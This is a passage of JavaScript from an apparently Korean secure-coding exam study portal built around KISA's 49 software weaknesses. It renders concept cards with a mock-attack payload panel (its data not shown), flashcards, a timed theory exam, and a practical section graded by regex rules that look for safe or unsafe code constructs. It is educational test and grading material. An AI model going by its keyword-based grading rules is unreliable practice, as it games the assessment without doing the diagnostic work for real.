  const list=CONCEPTS.filter(x=>learnCat==='전체'||x.cat===learnCat);
  const cards=list.map(x=>{
    const gi=CONCEPTS.indexOf(x);
    const done=learned[x.name]?' done':'';
    const sim=SIMMAP[x.name]?'<a class="simlink" href="'+SIMMAP[x.name]+'">🔗 관련 시뮬레이터로 →</a>':'';
    const scenData=getScenario(x.cwe, x.name);
    
    const attackSim = `
      <div class="fld attack-simulator" onclick="if(event)event.stopPropagation()">
        <div class="lb">💥 모의 공격 시나리오 & 페이로드 시뮬레이션</div>
        <div class="sim-card">
          <div class="sim-scen"><b>공격 시나리오:</b> ${esc(scenData.scenario)}</div>
          <div class="sim-payload"><b>공격 페이로드 예시:</b> <code>${esc(scenData.payload)}</code></div>
          <div class="sim-terminal" id="sim-term-${gi}">
            <span style="color:#64748b">// 아래 버튼을 클릭하여 시뮬레이션을 실행하세요.</span>
          </div>
          <button class="qbtn ghost" style="padding:6px 12px; font-size:12px; margin-top:8px; display:inline-flex; align-items:center; gap:6px;" onclick="runConceptSimulation(event, ${gi}, '${esc(x.cwe)}', '${esc(x.name)}')">
            ⚡ 모의 공격 시뮬레이션 실행
          </button>
        </div>
      </div>
    `;

    return '<div class="ccard'+done+'" id="cc'+gi+'"><div class="ch" onclick="toggleCard('+gi+')"><div><h4>'+esc(x.name)+'</h4><div class="cwe">'+esc(x.cwe)+'</div></div><span class="badge" style="background:'+CCOLOR[x.cat]+'">'+x.cat+'</span></div>'+
      '<div class="detail">'+examHtml(x.exam)+fld('정의',x.desc)+fld('보안 위협',x.risk)+fld('안전한 코딩',x.safe)+fld('진단 방법',x.diag)+attackSim+treeHtml(x.tree)+codeBlock(gi,x.name)+sim+'<button class="done-btn" onclick="toggleDone('+gi+')">'+(learned[x.name]?'✓ 학습 완료':'학습 완료로 표시')+'</button></div></div>';
  }).join('');
  
  document.getElementById('v-learn').innerHTML='<h2 class="st">📖 개념 학습 — 49개 보안약점</h2><p class="sub">카드를 펼치면 정의·위협·진단법과 함께 <b>KISA 가이드의 Java·Python 안전하지 않은/안전한 코드 예제</b>를 확인할 수 있습니다. (Java=진단가이드, Python=시큐어코딩 가이드)</p><div class="catbar">'+chips+'<button class="cchip" style="margin-left:auto" onclick="printSummary()" title="49개 약점 요약표를 PDF로 인쇄/저장">🖨️ 요약 인쇄(PDF)</button></div>'+catInfoHtml(learnCat)+'<div class="cgrid">'+cards+'</div>';
}
// 49개 약점 요약표 인쇄/PDF 저장 (오프라인 복습용)
function printSummary(){
  const rows=CONCEPTS.map(x=>'<tr><td>'+esc(x.cat)+'</td><td><b>'+esc(x.name)+'</b><br><span class="pcwe">'+esc(x.cwe)+'</span></td><td>'+esc(x.desc)+'</td><td>'+esc(x.safe)+'</td></tr>').join('');
  document.getElementById('printArea').innerHTML='<h2 class="ptitle">KISA 49개 보안약점 요약 — 진단원 학습 센터</h2><p class="psub">유형·약점명·정의·안전한 코딩 핵심 (출처: KISA 가이드 기반 재구성)</p><table class="ptbl"><thead><tr><th>유형</th><th>약점 (CWE)</th><th>정의</th><th>안전한 코딩</th></tr></thead><tbody>'+rows+'</tbody></table>';
  window.print();
}
// 선택한 7대 유형의 개요 배너 (전체 선택 시 미표시)
function catInfoHtml(cat){
  const info=CATEGORY_INFO[cat]; if(!info)return '';
  return '<div class="catinfo" style="border-left-color:'+CCOLOR[cat]+'">'+
    '<div class="ci-h"><span class="ci-badge" style="background:'+CCOLOR[cat]+'">'+esc(cat)+'</span> '+esc(info.full)+'</div>'+
    '<div class="ci-row"><b>정의</b> '+esc(info.def)+'</div>'+
    '<div class="ci-row"><b>대표 약점</b> '+esc(info.ex)+'</div>'+
    '<div class="ci-row"><b>진단 핵심</b> '+esc(info.diag)+'</div></div>';
}
function fld(l,t){return '<div class="fld"><div class="lb">'+l+'</div><div class="tx">'+esc(t)+'</div></div>';}
// 진단 의사결정 흐름: 위에서 아래로 게이트를 점검(먼저 '안전'으로 빠지면 약점 미성립)
function treeHtml(tree){
  if(!tree||!tree.length)return '';
  const steps=tree.map(function(s,i){
    const q=esc(s[0]),v=esc(s[1]);
    let cls='cond';
    if(v.indexOf('안전')===0)cls='safe';else if(v.indexOf('위험')===0)cls='risk';
    return '<div class="dtstep '+cls+'"><span class="dtn">'+(i+1)+'</span><div class="dtq">'+q+
      '</div><div class="dtv">'+v+'</div></div>';
  }).join('<div class="dtarrow">▼</div>');
  return '<div class="fld"><div class="lb">🔍 진단 의사결정 흐름</div>'+
    '<div class="dtnote">코드를 보고 위에서 아래로 점검합니다. 먼저 <b>안전</b> 분기로 빠지면 해당 약점은 성립하지 않고, '+
    '마지막 <b>위험</b> 게이트까지 도달하면 정탐입니다.</div><div class="dtree">'+steps+'</div></div>';
}
function examHtml(exam){
  if(!exam)return '';
  return '<div class="exambox"><div class="examh">⭐ 시험 강조 포인트</div><div class="examb">'+esc(exam)+'</div></div>';
}
function codePane(vuln,safe){
  return '<div class="codepair"><div class="cp"><div class="cph bad">🚫 안전하지 않은 코드</div><pre class="cpre">'+esc(vuln||'(예제 없음)')+'</pre></div>'+
         '<div class="cp"><div class="cph good">✅ 안전한 코드</div><pre class="cpre">'+esc(safe||'(예제 없음)')+'</pre></div></div>';
}
function codeBlock(gi,name){
  const cd=CODE49[name]; if(!cd) return '';
  const hasPy=!!(cd.pyVuln&&cd.pySafe), jl=cd.javaLang||'Java';
  let tabs='<div class="lgtabs"><button class="lgtab on" id="lgj'+gi+'" onclick="setLang(event,'+gi+',\'j\')">'+esc(jl)+' · 진단가이드</button>'+
    (hasPy?'<button class="lgtab" id="lgp'+gi+'" onclick="setLang(event,'+gi+',\'p\')">Python · 시큐어코딩</button>':'')+'</div>';
  let jpane='<div id="lgjp'+gi+'">'+codePane(cd.javaVuln,cd.javaSafe)+'</div>';
  let ppane=hasPy?'<div id="lgpp'+gi+'" style="display:none">'+codePane(cd.pyVuln,cd.pySafe)+'</div>':'';
  let note='';
  if(!hasPy)note='<div class="cnote">※ '+esc(cd.note||'해당 약점은 Python 시큐어코딩 가이드에 코드 예제가 수록되어 있지 않습니다.')+'</div>';
  else if(cd.note)note='<div class="cnote">※ '+esc(cd.note)+'</div>';
  return '<div class="fld"><div class="lb">📑 가이드 코드 예제</div>'+tabs+jpane+ppane+note+
    '<div class="csrc">출처: 「소프트웨어 보안약점 진단가이드(2021)」(Java/C) · 「Python 시큐어코딩 가이드(2023)」 — KISA</div></div>';
}
function setLang(e,gi,which){
  if(e&&e.stopPropagation)e.stopPropagation();
  document.getElementById('lgjp'+gi).style.display=which==='j'?'block':'none';
  const pp=document.getElementById('lgpp'+gi); if(pp)pp.style.display=which==='p'?'block':'none';
  document.getElementById('lgj'+gi).classList.toggle('on',which==='j');
  const pb=document.getElementById('lgp'+gi); if(pb)pb.classList.toggle('on',which==='p');
}
function setLearnCat(c){learnCat=c;rLearn();}
function toggleCard(i){document.getElementById('cc'+i).classList.toggle('open');}
function toggleDone(i){const n=CONCEPTS[i].name;if(learned[n])delete learned[n];else{learned[n]=true;awardXp(10,'개념 학습: '+n,'c:'+n);}save('learned',learned);rLearn();}

// ===== 플래시카드 =====
let flashCat='전체',flashDeck=[],flashIdx=0,flashFlip=false;
function rFlash(){
  const chips=['전체',...CATS].map(c=>'<button class="cchip'+(c===flashCat?' on':'')+'" onclick="setFlashCat(\''+c+'\')">'+c+'</button>').join('');
  if(!flashDeck.length)buildDeck();
  document.getElementById('v-flash').innerHTML='<h2 class="st">🃏 플래시카드</h2><p class="sub">약점명을 보고 핵심을 떠올린 뒤 카드를 눌러 확인하세요. "안다"는 다음 회차 덱에서 제외됩니다.</p><div class="catbar">'+chips+'</div><div id="flashStage"></div>';
  drawFlash();
}
function setFlashCat(c){flashCat=c;flashDeck=[];flashIdx=0;flashFlip=false;rFlash();}
function buildDeck(){let pool=CONCEPTS.filter(x=>flashCat==='전체'||x.cat===flashCat);
  // 미숙련 카드를 앞에 두되, 숙련 카드도 덱에 포함해 계속 복습(영구 제외 방지)
  const un=shuffle(pool.filter(x=>!flashKnown[x.name])), kn=shuffle(pool.filter(x=>flashKnown[x.name]));
  flashDeck=un.concat(kn);flashIdx=0;flashFlip=false;}
function drawFlash(){
  const stage=document.getElementById('flashStage');const pool=CONCEPTS.filter(x=>flashCat==='전체'||x.cat===flashCat);const known=pool.filter(x=>flashKnown[x.name]).length;
  if(flashIdx>=flashDeck.length){stage.innerHTML='<div class="flash-stage"><div class="fcard"><div class="fr">🎉 이번 덱 완료!</div><div class="hint">숙련 '+known+'/'+pool.length+'</div></div><div class="frow"><button class="btn" onclick="restartDeck()">다시 섞어 풀기</button></div></div>';return;}
  const c=flashDeck[flashIdx];
  const front='<div class="face-cat" style="background:'+CCOLOR[c.cat]+'">'+c.cat+'</div><div class="fr">'+esc(c.name)+'</div><div class="hint">탭하여 핵심 보기</div>';
  const back='<div class="face-cat" style="background:'+CCOLOR[c.cat]+'">'+esc(c.cwe)+'</div><div class="bk"><b>정의</b> '+esc(c.desc)+'<br><br><b>안전한 코딩</b> '+esc(c.safe)+'</div>';
  stage.innerHTML='<div class="fmeta">'+(flashIdx+1)+' / '+flashDeck.length+' · 숙련 '+known+'/'+pool.length+'</div><div class="flash-stage"><div class="fcard" onclick="flipFlash()">'+(flashFlip?back:front)+'</div><div class="frow"><button class="f-no" onclick="markFlash(false)">아직 모른다</button><button class="f-ok" onclick="markFlash(true)">안다 ✓</button></div></div>';
}
function flipFlash(){flashFlip=!flashFlip;drawFlash();}
function markFlash(ok){const n=flashDeck[flashIdx].name;if(ok){flashKnown[n]=true;awardXp(5,'플래시 숙련: '+n,'f:'+n);}else delete flashKnown[n];save('flash',flashKnown);flashIdx++;flashFlip=false;drawFlash();}
function restartDeck(){buildDeck();drawFlash();}

// ===== 1교시 이론 (MC·OX·SHORT) =====
let exPool=[],exIdx=0,exN=0,exAns=[],exTimer=null,exLeft=0;
function examItems(){return QUIZ.map(x=>Object.assign({type:'MC'},x)).concat(THEORY);}
// 2026 이수시험 안내서 기준 실제 시험 구조(공식)
function examInfoHtml(){
  return '<div class="examinfo"><b>📋 2026 실제 이수시험 구조</b>'+
   '<ul><li><b>1교시 이론</b> 60분 · <b>30문항 전면 객관식</b>(OMR, 2025년~) · 가중치 40%</li>'+
   '<li><b>2교시 실습</b> 100분 · <b>15문항 서술형</b>(보안약점 정·오탐 분석 + 설계문서 진단보고서) · 가중치 60%</li>'+
   '<li>합격: <b>종합 70점 이상</b> · 과락 <b>각 60점 미만</b> · 시험 중 \'SW 보안약점 기준 명칭\' 제공</li></ul>'+
   '<span class="ei-note">※ 본 포털은 연습용이라 OX·단답도 포함합니다. 실제 1교시는 전면 객관식이니 아래 <b>실전 30문항(객관식)</b>으로 연습하세요.</span></div>';
}
function rExam(){
  const all=examItems();const mc=all.filter(q=>q.type==='MC').length;
  document.getElementById('v-exam').innerHTML='<h2 class="st">📝 1교시 이론 (필기)</h2>'+examInfoHtml()+
   '<p class="sub">풀이 중 정답은 비공개, 제출 후 채점·해설. (문제은행 총 '+all.length+'문항 · 객관식 '+mc+')</p>'+
   '<div class="setbox"><h3>출제 설정</h3><p>문항 수를 고르면 무작위 출제됩니다. (문항당 40초 타이머)</p><div class="setrow"><button class="qbtn" onclick="startExam(30,true)">🎯 실전 30문항(객관식)</button><button class="qbtn ghost" onclick="startExam(15)">15문항(혼합)</button><button class="qbtn ghost" onclick="startExam(999)">전체</button></div>'+(examBest!=null?'<p>최고 기록: <b>'+examBest+'%</b></p>':'<p>아직 기록이 없습니다.</p>')+'</div>';
}
function startExam(n,mcOnly){
  let items=examItems();if(mcOnly)items=items.filter(q=>q.type==='MC');
  let pool=shuffle(items).slice(0,Math.min(n,items.length));
  // 객관식 보기 순서 셔플(위치 암기 방지) — 보기 재배열 후 정답 인덱스 재매핑
  exPool=pool.map(q=>{ if(q.type==='MC'&&Array.isArray(q.o)){ const idx=shuffle(q.o.map((_,i)=>i)); return Object.assign({},q,{o:idx.map(i=>q.o[i]),a:idx.indexOf(q.a)}); } return q; });
  exN=exPool.length;exIdx=0;exAns=[];exLeft=exN*40;startExTimer();drawExam();}
function startExTimer(){clearInterval(exTimer);exTimer=setInterval(()=>{exLeft--;const t=document.getElementById('exTimer');if(t){const m=Math.floor(exLeft/60),s=exLeft%60;t.textContent='⏱ '+m+':'+String(s).padStart(2,'0');t.classList.toggle('warn',exLeft<=30);}if(exLeft<=0){clearInterval(exTimer);gradeExam();}},1000);}
function drawExam(){
  const q=exPool[exIdx],pct=Math.round(exIdx/exN*100);const cat=q.c||q.cat||'';let body='';
  if(q.type==='MC'){body='<div>'+q.o.map((t,i)=>'<button class="opt'+(exAns[exIdx]===i?' sel':'')+'" onclick="pickEx('+i+')"><span class="lab">'+'ABCD'[i]+'</span><span class="ot"></span></button>').join('')+'</div>';}
  else if(q.type==='OX'){body='<div class="tfrow"><div class="tf'+(exAns[exIdx]===true?' sel tp':'')+'" onclick="pickEx(true)"><span class="rd"></span>⭕ 맞다 (O)</div><div class="tf'+(exAns[exIdx]===false?' sel fp':'')+'" onclick="pickEx(false)"><span class="rd"></span>❌ 아니다 (X)</div></div>';}
  else{body='<input class="shortin" id="shortIn" placeholder="정답을 입력하세요" value="'+esc(exAns[exIdx]||'')+'" oninput="exAns['+exIdx+']=this.value">';}
  document.getElementById('v-exam').innerHTML='<div class="qbox"><div class="bar2"><i style="width:'+pct+'%"></i></div><div class="qmeta"><span>문항 '+(exIdx+1)+' / '+exN+'</span><span class="timer" id="exTimer"></span></div><span class="typetag t-'+q.type+'">'+({MC:'객관식',OX:'OX',SHORT:'단답형'}[q.type])+'</span><span class="cat-tag">'+esc(cat)+'</span><div class="qtext"></div>'+(q.code?'<pre></pre>':'')+body+'<div class="nav"><button class="btn ghost" onclick="prevEx()" '+(exIdx===0?'disabled style=opacity:.4':'')+'>← 이전</button> <button class="btn" onclick="nextEx()">'+(exIdx===exN-1?'제출하고 채점':'다음 →')+'</button></div><div class="kbdhint">⌨ 키보드: '+(q.type==='MC'?'숫자 1~'+(q.o?q.o.length:4)+' 보기 선택':q.type==='OX'?'O / X 선택':'직접 입력')+' · Enter 다음</div></div>';
  document.querySelector('#v-exam .qtext').textContent=q.q;if(q.code)document.querySelector('#v-exam pre').textContent=q.code;
  if(q.type==='MC')document.querySelectorAll('#v-exam .opt').forEach((b,i)=>b.querySelector('.ot').textContent=q.o[i]);
  const t=document.getElementById('exTimer');const m=Math.floor(exLeft/60),s=exLeft%60;t.textContent='⏱ '+m+':'+String(s).padStart(2,'0');
}
function pickEx(v){exAns[exIdx]=v;drawExam();}
function prevEx(){if(exIdx>0){exIdx--;drawExam();}}
function nextEx(){if(exIdx<exN-1){exIdx++;drawExam();}else gradeExam();}
function exCorrect(q,a){if(a==null||a==='')return false;if(q.type==='MC')return a===q.a;if(q.type==='OX')return a===q.a;return (q.answers||[]).some(x=>{const u=gnorm(a),g=gnorm(x);return u&&(u===g||u.includes(g)||g.includes(u));});}
function exAnsText(q){if(q.type==='MC')return 'ABCD'[q.a]+'. '+q.o[q.a];if(q.type==='OX')return q.a?'O (맞다)':'X (아니다)';return (q.answers||[]).join(' / ');}
function exUserText(q,a){if(a==null||a==='')return '(미응답)';if(q.type==='MC')return (q.o[a]!=null?('ABCD'[a]+'. '+q.o[a]):String(a));if(q.type==='OX')return a?'O (맞다)':'X (아니다)';return String(a);}
function removeWrong(key){const n=wrongs.length;wrongs=wrongs.filter(w=>w.q!==key);if(wrongs.length!==n)save('wrong',wrongs);}
function gradeExam(){
  clearInterval(exTimer);let sc=0;const rev=[];
  exPool.forEach((q,i)=>{
    const ok=exCorrect(q,exAns[i]);const key='['+({MC:'객관식',OX:'OX',SHORT:'단답'}[q.type])+'] '+q.q;
    if(ok){sc++;removeWrong(key);} else {addWrong({q:key,a:exAnsText(q),e:q.e,tag:'1교시',code:q.code||'',cat:q.c||q.cat||''});}
    rev.push({q,a:exAns[i],ok});
  });
  const pct=Math.round(sc/exN*100),pass=pct>=70;if(examBest==null||pct>examBest){examBest=pct;save('examBest',pct);}
  awardXp(Math.max(3,Math.round(pct/5)),'1교시 응시 '+pct+'%');
  const reviewHtml=rev.map((r,i)=>{
    const q=r.q;const tag=({MC:'객관식',OX:'OX',SHORT:'단답형'}[q.type]);
    return '<div class="rev '+(r.ok?'ok':'no')+'"><div class="rv-h"><span class="typetag t-'+q.type+'">'+tag+'</span> '+(r.ok?'✔ 정답':'✗ 오답')+' <span class="rv-cat">'+esc(q.c||q.cat||'')+'</span></div>'+
      '<div class="rv-q">'+(i+1)+'. '+esc(q.q)+'</div>'+
      (r.ok?'':'<div class="rv-mine">내 답: '+esc(exUserText(q,r.a))+'</div>')+
      '<div class="rv-ans">정답: '+esc(exAnsText(q))+'</div>'+
      (q.e?'<div class="rv-exp">'+esc(q.e)+'</div>':'')+'</div>';
  }).join('');
  document.getElementById('v-exam').innerHTML='<div class="res"><div class="big">'+pct+'%</div><div class="pf '+(pass?'pass':'fail')+'">'+(pass?'✅ 합격 (70%+)':'❌ 불합격')+'</div><p class="sub">'+exN+'문항 중 '+sc+'문항 정답</p><div class="quick" style="justify-content:center"><button class="btn" onclick="rExam()">다시 응시</button><button class="btn ghost" onclick="tab(\'wrong\')">오답노트 ('+wrongs.length+')</button></div></div>'+
    '<h3 class="rev-title">📝 문항별 해설</h3><div class="rev-list">'+reviewHtml+'</div>';
  announce('1교시 채점 완료. '+pct+'점, '+(pass?'합격':'불합격')+'. '+exN+'문항 중 '+sc+'문항 정답.');
  window.scrollTo(0,0);
}

// ===== 2교시 실무 (정·오탐 판별 + 서술형 채점) =====
let prPool=[],prIdx=0,prN=0,prScores=[],prResults=[],prTP=null,prTimer=null,prLeft=0,prDiff='전체';
function pracPool(){return prDiff==='전체'?PRACTICAL:PRACTICAL.filter(p=>p.diff===prDiff);}
function setPrDiff(d){prDiff=d;rPrac();}
function rPrac(){
  const chips=['전체','하','중','상'].map(d=>{const cnt=d==='전체'?PRACTICAL.length:PRACTICAL.filter(p=>p.diff===d).length;return '<button class="cchip'+(d===prDiff?' on':'')+'" onclick="setPrDiff(\''+d+'\')">'+(d==='전체'?'전체':'난이도 '+d)+' '+cnt+'</button>';}).join('');
  const pool=pracPool();const tp=pool.filter(p=>p.isTruePositive).length;
  document.getElementById('v-prac').innerHTML='<h2 class="st">🧪 2교시 실무 (코드 진단)</h2>'+examInfoHtml()+'<p class="sub">코드가 <b>정탐(보안약점 존재)</b>인지 <b>오탐(안전한 코드)</b>인지 판별하고, 약점 명칭·진단 근거·개선 코드를 직접 작성합니다. 모범답안 키워드 기반 채점이며, 틀린 진단(예: 안전한 코드를 취약하다고 서술)은 감점됩니다. 합격선 70%.</p>'+
   '<div class="catbar">'+chips+'</div>'+
   '<div class="setbox"><h3>실무 평가</h3><p>실제 2교시처럼 서술형으로 진단합니다. (문항당 3분 권장 타이머)<br>현재 출제풀: <b>'+pool.length+'문항</b> (정탐 '+tp+' · 오탐 '+(pool.length-tp)+')</p><div class="setrow"><button class="qbtn ghost" onclick="startPrac(6)">6문항 무작위</button><button class="qbtn" onclick="startPrac(999)">전체 풀이 ('+pool.length+')</button></div>'+(pracBest!=null?'<p>최고 기록: <b>'+pracBest+'%</b></p>':'<p>아직 기록이 없습니다.</p>')+'</div>';
}
function startPrac(n){const pool=pracPool();if(!pool.length){alert('해당 난이도 문항이 없습니다.');return;}prPool=shuffle(pool);prPool=prPool.slice(0,Math.min(n,prPool.length));prN=prPool.length;prIdx=0;prScores=[];prResults=[];prLeft=prN*180;
  [...new Set(prPool.map(p=>p.lang))].forEach(l=>{try{loadTreeSitter(l);}catch(e){}});  // AST 파서 사전 로딩(비동기, 폴백 안전)
  startPrTimer();drawPrac();}
function startPrTimer(){clearInterval(prTimer);prTimer=setInterval(()=>{prLeft--;const t=document.getElementById('prTimer');if(t){const m=Math.floor(prLeft/60),s=prLeft%60;t.textContent='⏱ '+m+':'+String(s).padStart(2,'0');t.classList.toggle('warn',prLeft<=60);}if(prLeft<=0){clearInterval(prTimer);prResult();}},1000);}
function codeWithLines(code){return code.split('\n').map((l,i)=>'<span class="ln">'+String(i+1).padStart(2,' ')+': </span>'+esc(l)).join('\n');}
function drawPrac(){
  prTP=null;const p=prPool[prIdx],pct=Math.round(prIdx/prN*100);
  document.getElementById('v-prac').innerHTML='<div class="qbox"><div class="bar2"><i style="width:'+pct+'%"></i></div><div class="qmeta"><span>실무 '+(prIdx+1)+' / '+prN+' · '+esc(p.lang)+'</span><span class="timer" id="prTimer"></span></div>'+
    '<span class="typetag t-PRAC">코드 진단</span><span class="cat-tag">'+esc(p.title)+'</span> '+diffBadge(p.diff)+
    '<pre id="prCode"></pre>'+
    '<div class="flbl">1) 정·오탐 판별</div><div class="tfrow"><div class="tf tp" id="tfTP" onclick="setTP(true)"><span class="rd"></span>🚨 정탐 — 보안약점 존재</div><div class="tf fp" id="tfFP" onclick="setTP(false)"><span class="rd"></span>🛡️ 오탐 — 안전한 코드</div></div>'+
    '<div class="flbl">2) 보안약점 표준 명칭 <span style="font-weight:400;color:#94a3b8">(정탐 시, KISA 49개 자동완성)</span></div><input class="pin" id="prName" list="kisa49" placeholder="예) SQL 삽입" disabled>'+
    '<div class="flbl">3) 진단 및 판별 근거 서술</div><textarea class="parea" id="prReason" placeholder="왜 정탐/오탐인지 근거를 서술하세요 (예: Statement로 외부 입력을 문자열 결합하여 SQL 삽입 가능 / 정규식 화이트리스트 검증으로 차단됨)"></textarea>'+
    '<div class="flbl">4) 보안 대책 — 안전한 코드 작성 <span style="font-weight:400;color:#94a3b8">(정탐 시, 취약 부분을 직접 고쳐 작성)</span></div><textarea class="codearea" id="prFix" placeholder="여기에 취약점을 제거한 안전한 코드를 직접 작성하세요" disabled></textarea>'+
    '<div class="nav"><button class="btn" onclick="submitPrac()">제출 및 채점</button></div><div id="prReport"></div></div>';
  document.getElementById('prCode').innerHTML=codeWithLines(p.code);
  const t=document.getElementById('prTimer');const m=Math.floor(prLeft/60),s=prLeft%60;t.textContent='⏱ '+m+':'+String(s).padStart(2,'0');
}
function setTP(v){prTP=v;document.getElementById('tfTP').classList.toggle('sel',v===true);document.getElementById('tfFP').classList.toggle('sel',v===false);
  document.getElementById('prName').disabled=!(v===true);document.getElementById('prFix').disabled=!(v===true);}
// LASHR: 경량 구조 패턴 검증 — 핵심 약점은 키워드 나열이 아닌 '구조'가 갖춰졌는지 확인.
// 오탈락 방지를 위해 통과 시에만 만점 보장, 미확인 시에도 키워드 점수를 부분 인정(0점 처리 안 함).
// 데이터 구동 패턴맵: {all:[모두충족], any:[하나이상], none:[모두미존재]}. 각 모범답안은 반드시 통과(harness 강제).
const LASHR = {
  'SQL 삽입':{all:[/preparestatement\s*\(/i],any:[/\.set(string|int|long|object|date|timestamp|boolean|double|big\w*)\s*\(/i,/:\w+/]},
  '크로스사이트 스크립트(XSS)':{any:[/escapehtml\w*/i,/htmlescape/i,/encodeforhtml/i,/escapexml11?/i,/htmlutils\.html/i,/markupsafe/i,/\bescape\s*\(/i,/sanitize/i]},
  '경로 조작 및 자원 삽입':{all:[/startswith\s*\(/i],any:[/getcanonicalpath\s*\(/i,/(normalize|realpath|abspath|topath)\s*\(/i]},
  '하드코드된 중요정보':{any:[/getenv\s*\(/i,/getproperty\s*\(/i,/system\.getenv/i,/process\.env/i,/os\.environ/i,/\.env\b/i,/vault/i,/secretmanager/i,/config\.get/i]},
  '취약한 암호화 알고리즘 사용':{any:[/(aes|sha-?256|sha-?384|sha-?512|sha3|gcm|cbc)/i],none:[/\bdes\b/i,/3des/i,/\bmd5\b/i,/sha-?1\b/i,/\brc4\b/i,/\becb\b/i]},
  'Null Pointer 역참조':{any:[/is\s+none\b/i,/!=\s*null/i,/==\s*null/i,/\boptional\b/i,/requirenonnull/i,/isempty\s*\(/i,/\?\./]},
  '신뢰할 수 없는 데이터의 역직렬화':{any:[/resolveclass/i,/whitelist/i,/json\.loads/i,/json\.load\b/i,/readvalue/i,/safe_load/i],none:[/pickle\.loads/i,/pickle\.load\b/i,/yaml\.load\s*\([^)]*\)/i]},
  '운영체제 명령어 삽입':{any:[/subprocess\.(run|popen|call|check_output)\s*\(\s*\[/i,/new\s+processbuilder\s*\(/i]},
  '코드 삽입':{any:[/ast\.literal_eval/i,/json\.loads/i],none:[/\beval\s*\(/i,/\bexec\s*\(/i]},
  '적절하지 않은 난수값 사용':{any:[/securerandom/i,/secrets\./i,/systemrandom/i,/getrandomvalues/i,/randombytes/i],none:[/new\s+random\s*\(/i,/math\.random/i,/\brand\s*\(/i]},
  '솔트 없이 일방향 해시함수 사용':{all:[/(bcrypt|pbkdf2|scrypt|argon2|sha-?256|sha-?512|messagedigest)/i],any:[/gensalt/i,/getsalt/i,/\bsalt\b/i,/securerandom/i,/token_bytes/i,/os\.urandom/i]},
  '제거되지 않고 남은 디버그 코드':{none:[/system\.out\.print/i,/printstacktrace/i,/console\.log/i,/\bprintln\b/i,/\bdebug\b/i,/todo|fixme/i,/backdoor/i]},
  '신뢰되지 않는 URL 주소로 자동접속 연결':{any:[/\.contains\s*\(/i,/allowlist|whitelist|allowed/i,/set\.of\s*\(/i,/startswith\s*\(\s*["']\//i]},
  'HTTP 응답 분할':{any:[/\.matches\s*\(/i,/replaceall\s*\(/i,/\.replace\s*\(/i,/pattern\./i,/\\r|\\n|%0d|%0a/i]},
  '서버사이드 요청 위조(SSRF)':{any:[/allowed/i,/allowlist|whitelist/i,/not\s+in\b/i,/\.contains\s*\(/i]},
  'XML 외부 개체(XXE)':{all:[/setfeature\s*\(/i],any:[/disallow-doctype-decl/i,/external-general-entities/i,/external-parameter-entities/i,/feature_secure_processing/i,/xmlconstants/i]},
  'LDAP 삽입':{any:[/\{0\}/,/new\s+object\s*\[\]/i,/escapedn/i,/escapefilter/i,/encodeforldap/i,/searchcontrols/i]},
  '부적절한 인가':{any:[/accessdenied/i,/getattribute\s*\(\s*["']user/i,/\.equals\s*\(\s*userid/i,/hasrole|hasauthority|isauthorized/i,/\bforbidden\b/i,/getownerid/i]},
  '경쟁조건: 검사시점과 사용시점(TOCTOU)':{any:[/o_nofollow|o_excl|o_creat/i,/synchronized/i,/\block\s*\(/i,/\.lock\s*\(\s*\)/i,/flock/i,/mutex/i,/atomic/i,/reentrantlock/i]},
  '적절한 인증 없는 중요기능 허용':{any:[/hasrole|hasauthority/i,/getattribute\s*\(\s*["']login/i,/accessdenied|forbidden/i,/isauthenticated|isadmin/i,/principal|authentication/i]},
  '위험한 형식 파일 업로드':{any:[/\.equals\s*\(\s*ext/i,/ext\.equals/i,/endswith\s*\(/i,/allowed\w*\.(contains|indexof)/i,/lastindexof\s*\(\s*["']\./i,/getcontenttype|content-type/i,/whitelist/i]},
  'XML 삽입':{any:[/prepareexpression/i,/bindstring/i,/bind\w*\s*\(/i,/\$\w+/]},
  '크로스사이트 요청 위조(CSRF)':{any:[/csrf/i,/\btoken\b/i,/samesite/i,/antiforgery/i]},
  '정수형 오버플로우':{any:[/<\s*0\b/,/integer\.max|long\.max|\.max_value/i,/addexact|multiplyexact|subtractexact/i,/if\s*\([^)]*[<>]=?/]},
  '보안기능 결정에 사용되는 부적절한 입력값':{any:[/request\.session/i,/session\[/i,/getattribute\s*\(\s*["']role/i,/\.session\b/i]},
  '메모리 버퍼 오버플로우':{any:[/sizeof\s*\(/i,/strncpy|strncat|snprintf|memcpy_s|strcpy_s|strlcpy/i,/memcpy\s*\(/i],none:[/\bstrcpy\s*\(/i,/\bstrcat\s*\(/i,/\bgets\s*\(/i,/\bsprintf\s*\(/i]},
  '포맷 스트링 삽입':{any:[/printf\s*\(\s*["']/i,/\.format\s*\(\s*["']/i,/fprintf\s*\([^,]*,\s*["']/i]},
  '중요한 자원에 대한 잘못된 권한 설정':{any:[/chmod\s*\(/i,/0o[0-7]{3}/,/posixfilepermission/i,/setposix/i,/umask/i,/setreadable|setwritable/i],none:[/0o777/,/0o666/]},
  '암호화되지 않은 중요정보':{any:[/messagedigest/i,/sha-?256|sha-?512/i,/\baes\b/i,/encrypt/i,/bcrypt|pbkdf2/i,/cipher/i],none:[/\bmd5\b/i,/\bdes\b/i]},
  '충분하지 않은 키 길이 사용':{any:[/\b(2048|3072|4096)\b/,/generate\s*\(\s*[2-9]\d{3}/i,/keysize\s*\(\s*(2048|3072|4096|256)/i],none:[/generate\s*\(\s*(512|768|1024)\b/i,/keysize\s*\(\s*(512|1024)\b/i]},
  '취약한 비밀번호 허용':{any:[/\{8,\}/,/\{(?:[89]|1\d|2\d),?\}/,/len\s*\([^)]*\)\s*[<>]=?\s*([89]|1\d)/i,/\.length\s*[<>]=?\s*([89]|1\d)/i,/re\.compile/i,/\.matches\s*\(/i]},
  '부적절한 전자서명 확인':{any:[/getcodesigners/i,/\bsigners\b/i,/\.verify\s*\(/i,/verify_signature/i,/pkcs1/i,/\bsignature\b/i]},
  '부적절한 인증서 유효성 검증':{any:[/protocol_tls_client/i,/load_verify_locations/i,/wrap_socket/i,/check_hostname\s*=\s*true/i,/verify_mode\s*=\s*ssl\.cert_required/i],none:[/cert_none/i,/check_hostname\s*=\s*false/i]},
  '사용자 하드디스크에 저장되는 쿠키를 통한 정보 노출':{all:[/set_cookie|setcookie|new\s+cookie/i],any:[/secure\s*=\s*true/i,/httponly\s*=\s*true/i,/sethttponly|setsecure/i,/max_age/i,/samesite/i]},
  '무결성 검사 없는 코드 다운로드':{any:[/hashlib/i,/sha-?256/i,/hexdigest/i,/checksum/i,/\bhmac\b/i,/\.digest\b/i,/\bsignature\b/i]},
  '반복된 인증시도 제한 기능 부재':{any:[/max_attempts|maxattempts|max_tries|maxtries/i,/attempts?/i,/count\s*</i,/lockout|ratelimit|rate_limit|islocked/i]},
